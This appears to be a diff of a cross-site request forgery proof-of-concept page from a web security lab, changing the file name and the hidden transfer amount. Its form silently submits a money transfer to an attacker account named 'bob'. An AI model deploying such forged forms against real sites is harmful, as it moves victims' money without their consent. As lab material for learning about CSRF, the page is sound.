@@ -1,6 +1,6 @@
 <!-- Host site on temp server; local file has a `null` origin which runs into cors -->
 <!-- python3 -m http.server 8000 -->
-<!-- http://localhost:8000/6c_page.html -->
+<!-- http://localhost:8000/csrf.html -->
 
 <!DOCTYPE html>
 <html>
@@ -11,7 +11,7 @@
         <!-- Due to app implementation, needs a valid account; assume bob is attacker -->
         <!-- Hide values for form inputs, leave submit button -->
         <input type="hidden" name="to" value="bob">
-        <input type="hidden" name="amount" value="100">
+        <input type="hidden" name="amount" value="101">
         <button type="submit">CSRF request</button>
     </form>
 
